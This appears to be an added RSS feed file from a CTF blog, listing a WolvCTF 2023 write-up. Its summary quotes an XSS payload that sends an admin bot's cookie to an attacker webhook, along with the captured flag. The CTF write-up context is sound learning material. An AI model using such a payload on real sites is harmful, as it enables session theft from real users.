@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Forensic on chrootcommit</title>
+    <link>https://chrootcommit.github.io/tags/forensic/</link>
+    <description>Recent content in Forensic on chrootcommit</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 20 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://chrootcommit.github.io/tags/forensic/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WolvCTF 2023 - Writeup</title>
+      <link>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</link>
+      <pubDate>Mon, 20 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</guid>
+      <description>Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&amp;rsquo;s admin. (admin is a bot who visits the url you give).
+Payload : &amp;lt;script&amp;gt;window.location=&amp;#34;https://&amp;lt;myWebHook&amp;gt;/?c=&amp;#34;.concat(document.cookie)&amp;lt;/script&amp;gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&amp;rsquo;t gather the cookie throught the document object.</description>
+    </item>
+    
+  </channel>
+</rss>
